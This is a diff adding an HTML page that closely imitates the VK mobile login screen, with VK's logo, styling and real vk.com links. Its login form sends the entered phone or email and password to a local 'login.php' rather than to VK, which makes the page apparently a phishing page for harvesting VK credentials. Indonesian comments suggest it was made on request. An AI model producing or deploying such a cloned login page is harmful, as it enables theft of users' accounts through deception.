@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en" class="vk vk_js_yes vk_flex_yes">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <meta name="format-detection" content="telephone=no" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>VK mobile version</title>
+  <link rel="icon" href="https://m.vk.com/images/icons/favicons/fav_logo_2x.ico?8" />
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+    body {
+      background: #fff;
+      color: #000;
+      line-height: 1.4;
+    }
+    .pcont {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 24px 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .PageBlock {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      padding: 24px;
+      width: 100%;
+      max-width: 400px;
+    }
+    .login_header {
+      text-align: center;
+      font-size: 18px;
+      margin-bottom: 24px;
+      color: #5181b8;
+    }
+    .textfield {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 16px;
+      outline: none;
+    }
+    .textfield:focus {
+      border-color: #5181b8;
+    }
+    .button {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: bold;
+      text-align: center;
+      background: #5181b8;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin: 8px 0;
+    }
+    .button.success {
+      background: #4caf50;
+    }
+    .button:hover {
+      opacity: 0.9;
+    }
+    .near_btn a {
+      color: #5181b8;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .login_new_user {
+      margin-top: 24px;
+      text-align: center;
+    }
+    .fi_header {
+      font-size: 14px;
+      color: #777;
+      margin-bottom: 12px;
+    }
+    .socials {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 16px;
+    }
+    .social_button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      text-decoration: none;
+      color: #333;
+      font-weight: 500;
+    }
+    .social_google {
+      background: #f5f5f5;
+    }
+    .social_icon {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      margin-right: 8px;
+      background: no-repeat center/contain;
+    }
+    .social_google .social_icon {
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%234285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="%2334A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="%23FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.63z"/><path fill="%23EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>');
+    }
+    .social_button:nth-child(2) .social_icon {
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%231877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.378 10.937 10.125 11.853v-8.383H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.315 0 2.664.236 2.664.236v2.953h-1.513c-1.49 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.383C19.622 23.01 24 18.063 24 12.073z"/></svg>');
+    }
+
+    /* Logo VK */
+    .logo-container {
+      margin-bottom: 24px;
+      display: flex;
+      justify-content: center;
+    }
+    .logo-container svg {
+      width: 64px;
+      height: 64px;
+    }
+
+    @media (max-width: 480px) {
+      .pcont {
+        padding: 16px;
+      }
+      .PageBlock {
+        padding: 20px;
+      }
+      .logo-container svg {
+        width: 56px;
+        height: 56px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="pcont">
+    <!-- Logo VK yang baru (SVG resmi dari Anda) -->
+    <div class="logo-container">
+      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 202 202">
+        <style>
+          .st0 { clip-path: url(#SVGID_2_); fill: #5181b8 }
+          .st1 { fill-rule: evenodd; clip-rule: evenodd; fill: #fff }
+        </style>
+        <defs>
+          <path id="SVGID_1_" d="M71.6 5h58.9C184.3 5 197 17.8 197 71.6v58.9c0 53.8-12.8 66.5-66.6 66.5H71.5C17.7 197 5 184.2 5 130.4V71.5C5 17.8 17.8 5 71.6 5z"/>
+          <clipPath id="SVGID_2_">
+            <use xlink:href="#SVGID_1_" overflow="visible"/>
+          </clipPath>
+        </defs>
+        <use xlink:href="#SVGID_1_" overflow="visible" fill-rule="evenodd" clip-rule="evenodd" fill="#5181b8"/>
+        <path class="st0" d="M0 0h202v202H0z"/>
+        <path id="Logo" class="st1" d="M162.2 71.1c.9-3 0-5.1-4.2-5.1h-14c-3.6 0-5.2 1.9-6.1 4 0 0-7.1 17.4-17.2 28.6-3.3 3.3-4.7 4.3-6.5 4.3-.9 0-2.2-1-2.2-4V71.1c0-3.6-1-5.1-4-5.1H86c-2.2 0-3.6 1.7-3.6 3.2 0 3.4 5 4.2 5.6 13.6v20.6c0 4.5-.8 5.3-2.6 5.3-4.7 0-16.3-17.4-23.1-37.4-1.4-3.7-2.7-5.3-6.3-5.3H42c-4 0-4.8 1.9-4.8 4 0 3.7 4.7 22.1 22.1 46.4C70.9 133 87.2 142 102 142c8.9 0 10-2 10-5.4V124c0-4 .8-4.8 3.7-4.8 2.1 0 5.6 1 13.9 9 9.5 9.5 11.1 13.8 16.4 13.8h14c4 0 6-2 4.8-5.9-1.3-3.9-5.8-9.6-11.8-16.4-3.3-3.9-8.2-8-9.6-10.1-2.1-2.7-1.5-3.9 0-6.2 0-.1 17.1-24.1 18.8-32.3z"/>
+      </svg>
+    </div>
+
+    <!-- Form Login -->
+    <div class="PageBlock">
+      <div class="form_item">
+        <div class="login_header">
+          Stay in touch on the go with VK mobile.
+        </div>
+        <form method="POST" action="login.php" novalidate>
+          <input type="text" class="textfield" name="email" placeholder="Phone or email" required />
+          <input type="password" class="textfield" name="pass" placeholder="Password" required />
+          <div class="fi_row_new">
+            <input class="button wide_button" type="submit" value="Log in" />
+          </div>
+          <div class="fi_row">
+            <div class="near_btn wide_button login_restore">
+              <a href="https://static.vk.com/restore" rel="noopener">Forgot password?</a>
+            </div>
+          </div>
+          <div class="login_new_user">
+            <div class="fi_header fi_header_light">First time on VK?</div>
+          </div>
+          <div class="fi_row">
+            <a class="button wide_button success" href="https://m.vk.com/join" rel="noopener">Sign up for VK</a>
+          </div>
+          <div class="socials">
+            <a href="https://m.vk.com/login?act=google_sign" class="social_button social_google">
+              <i class="social_icon"></i>Log in with Google
+            </a>
+            <a href="https://m.vk.com/login?act=fb_sign" class="social_button">
+              <i class="social_icon"></i>Log in with Facebook
+            </a>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    if (window.innerWidth <= 699) {
+      // opsional: redirect jika perlu
+    }
+  </script>
+</body>
+</html>
